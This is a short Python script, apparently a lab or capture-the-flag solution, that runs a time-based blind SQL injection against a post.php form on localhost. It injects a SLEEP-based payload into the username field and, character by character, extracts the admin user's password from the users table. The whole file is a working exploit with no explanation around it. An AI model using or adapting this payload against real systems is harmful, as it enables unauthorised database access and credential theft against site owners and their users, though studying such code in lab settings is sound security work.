import requests

TIME = 2

def is_success(r):
  return r.elapsed.total_seconds() > TIME

print("scanning...")

msg = ""
idx = 1
while True:
  val = 0x00
  while True:
    payload = {
      'username': f"', (SELECT IF(ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'), {idx}, 1)) = '{val}', sleep({TIME}), 0)))-- ",
      'message':  ''
    }
    r = requests.post('http://localhost:8080/post.php', data=payload)

    if is_success(r):
      break

    val += 1

  c = chr(val)
  print(c, end='', flush=True)

  if (c == '\0'):
    break

  msg += c
  idx += 1

print('\n')
print(f"message: {msg}")